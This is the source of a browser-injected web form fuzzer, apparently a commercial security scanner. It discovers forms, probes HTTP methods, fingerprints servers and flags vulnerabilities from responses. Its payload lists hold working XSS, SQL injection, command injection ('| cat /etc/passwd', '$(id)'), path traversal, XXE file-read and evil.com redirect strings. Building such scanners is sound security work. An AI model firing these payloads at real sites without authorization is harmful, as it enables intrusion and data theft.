// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Lonkero Smart Form Fuzzer v2.1
 *
 * SMART features:
 * - Probes forms to detect working HTTP method (GET/POST/PUT)
 * - Early abort on consistent 4xx/5xx errors
 * - SPA form detection (React/Vue/Angular/Svelte)
 * - UI framework support (Quasar, Vuetify, Element UI, Ant Design, PrimeVue)
 * - Baseline response comparison
 * - Server fingerprinting from error pages
 * - Learns from responses to reduce noise
 */

(function() {
  'use strict';

  // License check - validates against Bountyy license server
  const _lk = window.__lonkeroKey;
  if (!_lk || !_lk.startsWith('LONKERO-') || _lk.split('-').length !== 5) {
    console.warn('[Lonkero] Form Fuzzer requires a valid license. Visit https://bountyy.fi');
    window.formFuzzer = { scan: () => Promise.reject(new Error('License required')), discoverAndFuzzForms: () => Promise.reject(new Error('License required')), getReport: () => ({error: 'License required'}) };
    return;
  }
  // Server-side validation (async, non-blocking - disables on failure)
  let _lkValid = true;
  fetch('https://lonkero.bountyy.fi/api/v1/validate', {
    method: 'POST', headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({license_key: _lk, product: 'lonkero', version: '3.6.0'})
  }).then(r => r.json()).then(d => { if (!d.valid || d.killswitch_active) _lkValid = false; }).catch(() => {});

  const PAYLOADS = {
    xss: [
      '<script>alert(1)</script>',
      '"><img src=x onerror=alert(1)>',
      "'-alert(1)-'",
      '{{constructor.constructor("alert(1)")()}}',
      '<svg/onload=alert(1)>',
      'javascript:alert(1)',
    ],

    sqli: [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "1' AND '1'='1",
      "1 OR 1=1",
      "' UNION SELECT NULL--",
      "admin'--",
      "' AND SLEEP(5)--",
    ],

    cmdi: [
      '; ls -la',
      '| cat /etc/passwd',
      '`whoami`',
      '$(id)',
    ],

    pathTraversal: [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\win.ini',
      '....//....//....//etc/passwd',
    ],

    ssti: [
      '{{7*7}}',
      '${7*7}',
      '<%= 7*7 %>',
      '#{7*7}',
    ],

    xxe: [
      '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    ],
  };

  // Field type patterns for smart payload selection
  const FIELD_PATTERNS = {
    login: /login|username|user|email|password|pass|pwd|auth/i,
    search: /search|query|q|keyword|find|filter/i,
    email: /email|mail/i,
    number: /id|num|number|amount|qty|quantity|price|count/i,
    url: /url|link|href|website|site|redirect|return|next|goto/i,
    file: /file|upload|attachment|document/i,
    comment: /comment|message|content|body|text|description|note/i,
  };

  class SmartFormFuzzer {
    constructor() {
      this.results = [];
      this.testedForms = new Set();
      this.serverFingerprint = null;
      this.discoveredApiEndpoints = new Set();
    }

    // ============================================================
    // PHASE 1: SMART FORM DISCOVERY
    // ============================================================

    discoverForms() {
      const formData = [];
      let formIndex = 0;

      // 1. Traditional <form> elements
      const forms = Array.from(document.querySelectorAll('form'));
      for (const form of forms) {
        const inputs = this.getTestableInputs(form);
        if (inputs.length > 0) {
          const isSPAForm = this.detectSPAForm(form);
          formData.push({
            index: formIndex++,
            action: form.action || location.href,
            method: (form.method || 'POST').toUpperCase(),
            inputs: inputs,
            element: form,
            isSPA: isSPAForm,
            hasJSHandler: !!form.onsubmit || form.hasAttribute('onsubmit'),
          });
        }
      }

      // 2. SPA virtual forms (containers with inputs + button)
      const virtualForms = this.discoverVirtualForms();
      for (const vf of virtualForms) {
        formData.push({ ...vf, index: formIndex++ });
      }

      return formData;
    }

    // Get testable inputs from a form
    getTestableInputs(container) {
      return Array.from(container.querySelectorAll('input, textarea, select'))
        .filter(input => {
          const type = (input.type || 'text').toLowerCase();
          return !['hidden', 'submit', 'button', 'reset', 'image'].includes(type);
        })
        .map(input => ({
          name: this.getInputName(input),
          type: input.type || 'text',
          placeholder: input.placeholder,
          value: input.value,
          element: input,
        }))
        .filter(i => i.name);
    }

    // Get a usable name for an input
    getInputName(input) {
      return input.name || input.id ||
             input.getAttribute('data-name') ||
             input.getAttribute('data-field') ||
             input.getAttribute('ng-model') ||
             input.getAttribute('formcontrolname') ||
             input.getAttribute('data-testid') ||
             // Quasar, Vuetify, Element UI use aria-label
             input.getAttribute('aria-label')?.replace(/[^a-zA-Z0-9]/g, '_').toLowerCase() ||
             // Some frameworks use associated label
             this.getAssociatedLabel(input) ||
             input.placeholder?.replace(/[^a-zA-Z0-9]/g, '_').toLowerCase() ||
             `field_${Math.random().toString(36).slice(2, 8)}`;
    }

    // Get label text from parent container or associated label element
    getAssociatedLabel(input) {
      // Check for wrapping label (Quasar style: <label class="q-field"><input></label>)
      const parentLabel = input.closest('label');
      if (parentLabel) {
        // Get text content from label's inner control (not including input value)
        const labelText = parentLabel.querySelector('.q-field__label, .v-label, .el-form-item__label, .ant-form-item-label, [class*="label"]');
        if (labelText?.textContent) {
          return labelText.textContent.trim().replace(/[^a-zA-Z0-9]/g, '_').toLowerCase();
        }
      }

      // Check for label with for= attribute
      if (input.id) {
        const forLabel = document.querySelector(`label[for="${input.id}"]`);
        if (forLabel?.textContent) {
          return forLabel.textContent.trim().replace(/[^a-zA-Z0-9]/g, '_').toLowerCase();
        }
      }

      // Check parent container for label element
      const container = input.closest('.q-field, .v-input, .el-form-item, .ant-form-item, .field, [class*="form-group"]');
      if (container) {
        const label = container.querySelector('label, .q-field__label, .v-label, .el-form-item__label');
        if (label?.textContent) {
          return label.textContent.trim().replace(/[^a-zA-Z0-9]/g, '_').toLowerCase();
        }
      }

      return null;
    }

    // Detect if form is a SPA form (React/Vue/Angular)
    detectSPAForm(form) {
      // Check for framework-specific attributes
      const spaIndicators = [
        // React
        '[data-reactroot]', '[data-reactid]',
        // Angular
        '[ng-submit]', '[ng-model]', '[@submit]',
        // Vue
        '[v-model]', '[@submit.prevent]',
        // Svelte
        '[data-svelte]',
        // Quasar framework classes
        '.q-form', '.q-field', '.q-input', '.q-btn',
        '[class*="q-field"]', '[class*="q-input"]',
        // Vuetify
        '.v-form', '.v-text-field', '.v-input',
        '[class*="v-text-field"]', '[class*="v-input"]',
        // Element UI / Element Plus
        '.el-form', '.el-input', '.el-form-item',
        '[class*="el-input"]', '[class*="el-form-item"]',
        // Ant Design Vue
        '.ant-form', '.ant-input', '.ant-form-item',
        '[class*="ant-input"]', '[class*="ant-form-item"]',
        // PrimeVue
        '[class*="p-inputtext"]', '[class*="p-field"]',
      ];

      for (const selector of spaIndicators) {
        try {
          if (form.querySelector(selector) || form.matches(selector)) {
            return true;
          }
        } catch (e) {
          // Invalid selector, skip
        }
      }

      // Check if form has preventDefault handler
      const onsubmit = form.getAttribute('onsubmit');
      if (onsubmit && onsubmit.includes('preventDefault')) {
        return true;
      }

      // Check for React synthetic event handlers
      const reactHandlerKeys = Object.keys(form).filter(k => k.startsWith('__reactEventHandlers'));
      if (reactHandlerKeys.length > 0) {
        return true;
      }

      // Check for Vue instance
      if (form.__vue__ || form.__vue_app__) {
        return true;
      }

      return false;
    }

    // Discover virtual forms (SPA containers)
    discoverVirtualForms() {
      const formData = [];
      const processedInputs = new Set();

      const selectors = [
        '[class*="form"]:not(form)', '[class*="Form"]:not(form)',
        '[class*="login"]', '[class*="Login"]',
        '[class*="auth"]', '[class*="Auth"]',
        '[class*="search"]', '[class*="Search"]',
        '[data-form]', '[role="form"]',
        // Quasar framework
        '.q-form', '.q-card', '.q-page',
        '[class*="q-field"]', '[class*="q-input"]',
        // Vuetify
        '.v-form', '.v-card',
        '[class*="v-text-field"]', '[class*="v-input"]',
        // Element UI / Element Plus
        '.el-form', '.el-card',
        '[class*="el-input"]', '[class*="el-form-item"]',
        // Ant Design
        '.ant-form', '.ant-card',
        '[class*="ant-input"]', '[class*="ant-form-item"]',
        // PrimeVue / PrimeFaces
        '.p-card', '[class*="p-inputtext"]', '[class*="p-field"]',
        // Buefy / Bulma
        '.field', '.box',
        // Chakra UI
        '[class*="chakra-form"]', '[class*="chakra-input"]',
      ];

      for (const container of document.querySelectorAll(selectors.join(','))) {
        if (container.closest('form')) continue;

        const inputs = this.getTestableInputs(container)
          .filter(i => !processedInputs.has(i.element));

        if (inputs.length === 0) continue;

        // Find buttons - include framework-specific button classes
        const buttonSelectors = [
          'button', '[type="submit"]', '[class*="submit"]',
          // Quasar
          '.q-btn', '[class*="q-btn"]',
          // Vuetify
          '.v-btn', '[class*="v-btn"]',
          // Element UI
          '.el-button', '[class*="el-button"]',
          // Ant Design
          '.ant-btn', '[class*="ant-btn"]',
          // PrimeVue
          '.p-button', '[class*="p-button"]',
          // Generic
          '[role="button"]', '[class*="btn"]',
        ];
        const buttons = container.querySelectorAll(buttonSelectors.join(','));
        if (buttons.length === 0) continue;

        inputs.forEach(i => processedInputs.add(i.element));

        formData.push({
          action: location.href,
          method: 'POST',
          inputs: inputs,
          element: container,
          isSPA: true,
          isVirtual: true,
        });
      }

      return formData;
    }

    // ============================================================
    // PHASE 2: SMART PROBING
    // ============================================================

    // Probe form to find working method and get baseline
    async probeForm(formInfo) {
      console.log(`[FormFuzzer] Probing form: ${formInfo.action}`);

      const probeResult = {
        workingMethod: null,
        baseline: null,
        serverInfo: null,
        isApiEndpoint: false,
        shouldSkip: false,
        skipReason: null,
      };

      // Build test data
      const testData = this.buildFormData(formInfo.inputs);

      // Try methods in order of likelihood
      const methodsToTry = formInfo.method === 'GET'
        ? ['GET', 'POST']
        : ['POST', 'GET', 'PUT', 'PATCH'];

      for (const method of methodsToTry) {
        try {
          const result = await this.sendRequest(formInfo.action, method, testData);

          // Fingerprint server from any response
          if (!probeResult.serverInfo && result.text) {
            probeResult.serverInfo = this.extractServerInfo(result.text, result.status, result.headers);
          }

          // 2xx = working method
          if (result.status >= 200 && result.status < 300) {
            probeResult.workingMethod = method;
            probeResult.baseline = {
              status: result.status,
              length: result.text.length,
              hash: this.simpleHash(result.text),
            };
            console.log(`[FormFuzzer] ✓ Method ${method} works (${result.status})`);
            break;
          }

          // 4xx errors
          if (result.status === 405) {
            console.log(`[FormFuzzer] Method ${method} not allowed, trying next...`);
            continue;
          }

          if (result.status === 401 || result.status === 403) {
            console.log(`[FormFuzzer] Auth required for ${method}`);
            // Still might be testable, continue
            continue;
          }

          if (result.status === 404) {
            // Form action doesn't exist
            probeResult.shouldSkip = true;
            probeResult.skipReason = 'Form action returns 404';
            break;
          }

        } catch (e) {
          console.log(`[FormFuzzer] Error probing ${method}: ${e.message}`);
        }
      }

      // If no method works but we're on a SPA, try to detect API calls
      if (!probeResult.workingMethod && formInfo.isSPA) {
        console.log(`[FormFuzzer] SPA form detected, will observe network for actual API calls`);
        probeResult.isApiEndpoint = true;
        // For SPA, we'll inject values and trigger the form normally
      }

      // Report server fingerprint if found
      if (probeResult.serverInfo) {
        this.reportServerFingerprint(probeResult.serverInfo, formInfo.action);
      }

      return probeResult;
    }

    // Extract server info from response
    extractServerInfo(text, status, headers = {}) {
      const serverPatterns = [
        { pattern: /openresty/i, name: 'OpenResty', type: 'server' },
        { pattern: /nginx\/[\d.]+/i, name: 'nginx', type: 'server' },
        { pattern: /nginx/i, name: 'nginx', type: 'server' },
        { pattern: /apache\/[\d.]+/i, name: 'Apache', type: 'server' },
        { pattern: /apache/i, name: 'Apache', type: 'server' },
        { pattern: /Microsoft-IIS/i, name: 'IIS', type: 'server' },
        { pattern: /cloudflare/i, name: 'Cloudflare', type: 'cdn' },
        { pattern: /varnish/i, name: 'Varnish', type: 'cache' },
        { pattern: /LiteSpeed/i, name: 'LiteSpeed', type: 'server' },
        { pattern: /Express/i, name: 'Express.js', type: 'framework' },
        { pattern: /Tomcat/i, name: 'Tomcat', type: 'server' },
        { pattern: /gunicorn/i, name: 'Gunicorn', type: 'server' },
        { pattern: /werkzeug/i, name: 'Werkzeug', type: 'framework' },
        { pattern: /ASP\.NET/i, name: 'ASP.NET', type: 'framework' },
        { pattern: /PHP\/[\d.]+/i, name: 'PHP', type: 'runtime' },
        { pattern: /Kestrel/i, name: 'Kestrel', type: 'server' },
        { pattern: /uvicorn/i, name: 'Uvicorn', type: 'server' },
      ];

      for (const { pattern, name, type } of serverPatterns) {
        if (pattern.test(text)) {
          const versionMatch = text.match(new RegExp(name + '[/\\s]*([\\d.]+)', 'i'));
          return {
            name: name,
            version: versionMatch ? versionMatch[1] : null,
            type: type,
            status: status,
            source: 'response_body',
          };
        }
      }

      // Check headers too
      const serverHeader = headers['server'] || headers['Server'];
      if (serverHeader) {
        return {
          name: serverHeader.split('/')[0],
          version: serverHeader.match(/[\d.]+/)?.[0] || null,
          type: 'server',
          status: status,
          source: 'header',
        };
      }

      return null;
    }

    // Report server fingerprint to extension
    reportServerFingerprint(info, url) {
      if (this.serverFingerprint) return; // Only report once
      this.serverFingerprint = info;

      console.log(`[FormFuzzer] Server fingerprint: ${info.name}${info.version ? ' ' + info.version : ''} (from ${info.status} response)`);

      window.postMessage({
        type: '__lonkero_finding__',
        finding: {
          type: 'SERVER_DISCLOSURE',
          server: info.name,
          version: info.version,
          serverType: info.type,
          source: info.source,
          status: info.status,
          url: url,
          severity: 'info',
        }
      }, '*');
    }

    // ============================================================
    // PHASE 3: SMART FUZZING
    // ============================================================

    async fuzzForm(formInfo) {
      const results = [];

      // First, probe the form
      const probe = await this.probeForm(formInfo);

      if (probe.shouldSkip) {
        console.log(`[FormFuzzer] Skipping form: ${probe.skipReason}`);
        return results;
      }

      if (!probe.workingMethod && !formInfo.isSPA) {
        console.log(`[FormFuzzer] No working HTTP method found, skipping traditional fuzzing`);
        return results;
      }

      // Use the working method
      const method = probe.workingMethod || formInfo.method;
      console.log(`[FormFuzzer] Fuzzing with method: ${method}`);

      // Track consecutive failures to abort early
      let consecutiveFailures = 0;
      const MAX_CONSECUTIVE_FAILURES = 3;

      for (const input of formInfo.inputs) {
        if (!input.name) continue;

        const fieldType = this.detectFieldType(input);
        const payloads = this.selectPayloads(fieldType);

        console.log(`[FormFuzzer] Testing field "${input.name}" (${fieldType}) with ${payloads.length} payloads`);

        for (const payload of payloads) {
          try {
            const result = await this.testPayload(formInfo, input, payload, method, probe.baseline);
            results.push(result);

            // Check for consecutive failures
            if (result.statusCode >= 400) {
              consecutiveFailures++;
              if (consecutiveFailures >= MAX_CONSECUTIVE_FAILURES) {
                console.log(`[FormFuzzer] ${MAX_CONSECUTIVE_FAILURES} consecutive failures, aborting field "${input.name}"`);
                break;
              }
            } else {
              consecutiveFailures = 0;
            }

            if (result.vulnerable) {
              console.log(`[FormFuzzer] 🔴 VULNERABLE: ${result.vulnType} in ${input.name}`);
              this.reportVulnerability(result);
            }

          } catch (e) {
            consecutiveFailures++;
          }
        }

        // Reset for next field
        consecutiveFailures = 0;
      }

      return results;
    }

    // Build form data from inputs
    buildFormData(inputs, targetInput = null, payload = null) {
      const data = {};
      for (const field of inputs) {
        if (targetInput && field.name === targetInput.name) {
          data[field.name] = payload;
        } else if (field.name) {
          data[field.name] = field.value || this.generateDefaultValue(field);
        }
      }
      return data;
    }

    // Generate default value based on field type
    generateDefaultValue(input) {
      const type = this.detectFieldType(input);
      switch (type) {
        case 'email': return 'test@example.com';
        case 'number': return '1';
        case 'url': return 'https://example.com';
        default: return 'test';
      }
    }

    // Send HTTP request
    async sendRequest(url, method, data) {
      const options = { method: method };

      if (method === 'GET') {
        const params = new URLSearchParams(data);
        url = url + (url.includes('?') ? '&' : '?') + params.toString();
      } else {
        // Try JSON first for API endpoints, fallback to FormData
        if (url.includes('/api/') || url.includes('/graphql')) {
          options.headers = { 'Content-Type': 'application/json' };
          options.body = JSON.stringify(data);
        } else {
          const formData = new FormData();
          for (const [key, value] of Object.entries(data)) {
            formData.append(key, value);
          }
          options.body = formData;
        }
      }

      const response = await fetch(url, options);
      const text = await response.text();

      // Extract headers
      const headers = {};
      response.headers.forEach((v, k) => headers[k] = v);

      return {
        status: response.status,
        text: text,
        headers: headers,
      };
    }

    // Test a single payload
    async testPayload(formInfo, input, payload, method, baseline) {
      const data = this.buildFormData(formInfo.inputs, input, payload);

      try {
        const result = await this.sendRequest(formInfo.action, method, data);

        // Check for vulnerability
        const vuln = this.checkVulnerability(payload, result.text, result.status, baseline);

        return {
          url: formInfo.action,
          method: method,
          field: input.name,
          fieldType: this.detectFieldType(input),
          payload: payload,
          statusCode: result.status,
          responseLength: result.text.length,
          vulnerable: vuln.isVulnerable,
          vulnType: vuln.type,
          evidence: vuln.evidence,
          isInteresting: vuln.isInteresting,
        };

      } catch (e) {
        return {
          url: formInfo.action,
          field: input.name,
          payload: payload,
          error: e.message,
          vulnerable: false,
        };
      }
    }

    // Check if response indicates vulnerability
    checkVulnerability(payload, responseText, status, baseline) {
      const result = { isVulnerable: false, isInteresting: false, type: null, evidence: null };

      // XSS - payload reflected without encoding
      if (responseText.includes(payload)) {
        // Check if in executable context
        const dangerousContexts = [
          /<script[^>]*>[^<]*/.source + payload.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'),
          /on\w+\s*=\s*['"]?[^'"]*/.source + payload.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'),
        ];

        for (const ctx of dangerousContexts) {
          if (new RegExp(ctx, 'i').test(responseText)) {
            result.isVulnerable = true;
            result.type = 'XSS';
            result.evidence = 'Payload reflected in executable context';
            return result;
          }
        }

        // Reflected but encoded - still interesting
        result.isInteresting = true;
      }

      // SQL Errors
      const sqlErrors = [
        /sql syntax.*mysql/i,
        /Warning.*\Wmysql_/i,
        /ORA-\d{5}/i,
        /PostgreSQL.*ERROR/i,
        /sqlite.*error/i,
        /ODBC.*Driver/i,
        /unclosed quotation mark/i,
        /quoted string not properly terminated/i,
        /Microsoft.*SQL.*Server/i,
      ];

      for (const pattern of sqlErrors) {
        if (pattern.test(responseText)) {
          result.isVulnerable = true;
          result.type = 'SQLi';
          result.evidence = `SQL error: ${responseText.match(pattern)?.[0]}`;
          return result;
        }
      }

      // SSTI - template evaluated
      if (payload.includes('{{7*7}}') && responseText.includes('49')) {
        result.isVulnerable = true;
        result.type = 'SSTI';
        result.evidence = 'Template {{7*7}} evaluated to 49';
        return result;
      }
      if (payload.includes('${7*7}') && responseText.includes('49')) {
        result.isVulnerable = true;
        result.type = 'SSTI';
        result.evidence = 'Template ${7*7} evaluated to 49';
        return result;
      }

      // Path traversal - system file contents
      if (/root:[x*]:0:0:/.test(responseText) || /\[boot loader\]/i.test(responseText)) {
        result.isVulnerable = true;
        result.type = 'Path Traversal';
        result.evidence = 'System file contents detected';
        return result;
      }

      // Command injection
      if (/uid=\d+.*gid=\d+/.test(responseText) || /total \d+\s+drwx/.test(responseText)) {
        result.isVulnerable = true;
        result.type = 'Command Injection';
        result.evidence = 'Command output detected';
        return result;
      }

      // Response differs significantly from baseline (might indicate something)
      if (baseline) {
        const currentHash = this.simpleHash(responseText);
        if (currentHash !== baseline.hash && Math.abs(responseText.length - baseline.length) > 100) {
          result.isInteresting = true;
        }
      }

      return result;
    }

    // Report vulnerability to extension
    reportVulnerability(result) {
      window.postMessage({
        type: '__lonkero_finding__',
        finding: {
          type: result.vulnType === 'XSS' ? 'XSS' : result.vulnType === 'SQLi' ? 'SQLi' : 'FORM_VULNERABILITY',
          severity: result.vulnType === 'SQLi' || result.vulnType === 'Command Injection' ? 'critical' : 'high',
          url: result.url,
          field: result.field,
          payload: result.payload,
          evidence: result.evidence,
          method: result.method,
        }
      }, '*');
    }

    // Simple hash for response comparison
    simpleHash(str) {
      let hash = 0;
      for (let i = 0; i < str.length; i++) {
        const char = str.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
      }
      return hash;
    }

    // Detect field type for smart payload selection
    detectFieldType(input) {
      const name = (input.name || '').toLowerCase();
      const placeholder = (input.placeholder || '').toLowerCase();
      const type = input.type;

      for (const [fieldType, pattern] of Object.entries(FIELD_PATTERNS)) {
        if (pattern.test(name) || pattern.test(placeholder)) {
          return fieldType;
        }
      }

      if (type === 'email') return 'email';
      if (type === 'number') return 'number';
      if (type === 'url') return 'url';

      return 'generic';
    }

    // Select payloads based on field type
    selectPayloads(fieldType) {
      switch (fieldType) {
        case 'login':
          return [...PAYLOADS.sqli.slice(0, 4), ...PAYLOADS.xss.slice(0, 2)];
        case 'search':
          return [...PAYLOADS.xss.slice(0, 4), ...PAYLOADS.sqli.slice(0, 2)];
        case 'email':
          return [
            'test@test.com"><script>alert(1)</script>',
            "test@test.com' OR '1'='1",
            'test@test.com{{7*7}}',
          ];
        case 'number':
          return ['1 OR 1=1', "1' AND '1'='1", '1; SELECT 1'];
        case 'url':
          return [
            'javascript:alert(1)',
            'https://evil.com',
            '//evil.com',
          ];
        case 'comment':
          return [...PAYLOADS.xss.slice(0, 4), ...PAYLOADS.ssti.slice(0, 2)];
        default:
          // Generic: fewer payloads, focused on high-impact
          return [...PAYLOADS.xss.slice(0, 3), ...PAYLOADS.sqli.slice(0, 2), PAYLOADS.ssti[0]];
      }
    }

    // ============================================================
    // PUBLIC API
    // ============================================================

    async discoverAndFuzzForms() {
      if (!_lkValid) throw new Error('License validation failed. Visit https://bountyy.fi');
      const forms = this.discoverForms();
      console.log(`[FormFuzzer] Found ${forms.length} forms`);

      if (forms.length === 0) {
        console.log('[FormFuzzer] No forms found on page');
        return [];
      }

      for (const form of forms) {
        const label = form.isSPA ? '(SPA)' : form.isVirtual ? '(Virtual)' : '';
        console.log(`[FormFuzzer] Testing form ${label}: ${form.action}`);
        console.log(`[FormFuzzer] Inputs: ${form.inputs.map(i => i.name).join(', ')}`);

        const results = await this.fuzzForm(form);
        this.results.push(...results);
      }

      const report = this.getReport();
      console.log(`[Lonkero] Form fuzzing complete:`, report);
      return this.results;
    }

    getReport() {
      const vulnerabilities = this.results.filter(r => r.vulnerable);
      const interesting = this.results.filter(r => r.isInteresting && !r.vulnerable);

      return {
        totalTests: this.results.length,
        vulnerabilities: vulnerabilities.length,
        interesting: interesting.length,
        serverFingerprint: this.serverFingerprint,
        findings: vulnerabilities.map(v => ({
          type: v.vulnType,
          url: v.url,
          field: v.field,
          payload: v.payload,
          evidence: v.evidence,
        })),
      };
    }

    // Quick scan - just probe forms and report info
    async quickScan() {
      const forms = this.discoverForms();
      console.log(`[FormFuzzer] Quick scan: ${forms.length} forms found`);

      for (const form of forms) {
        const probe = await this.probeForm(form);
        console.log(`[FormFuzzer] Form ${form.index}:`, {
          action: form.action,
          method: probe.workingMethod || 'none',
          inputs: form.inputs.length,
          isSPA: form.isSPA,
          server: probe.serverInfo?.name,
        });
      }

      return {
        forms: forms.length,
        serverFingerprint: this.serverFingerprint,
      };
    }
  }

  // Expose to window
  window.formFuzzer = new SmartFormFuzzer();

  console.log('[Lonkero] Smart Form Fuzzer v2.1 loaded');
  console.log('');
  console.log('  formFuzzer.discoverAndFuzzForms()  - Full smart fuzzing');
  console.log('  formFuzzer.quickScan()             - Just probe forms (no payloads)');
  console.log('  formFuzzer.getReport()             - Get results');
  console.log('');
  console.log('Smart features:');
  console.log('  ✓ Probes forms to find working HTTP method');
  console.log('  ✓ Early abort on consistent 4xx errors');
  console.log('  ✓ SPA form detection (React/Vue/Angular/Svelte)');
  console.log('  ✓ UI framework support (Quasar, Vuetify, Element UI, Ant Design, PrimeVue)');
  console.log('  ✓ Server fingerprinting from error pages');
  console.log('  ✓ Baseline response comparison');

})();
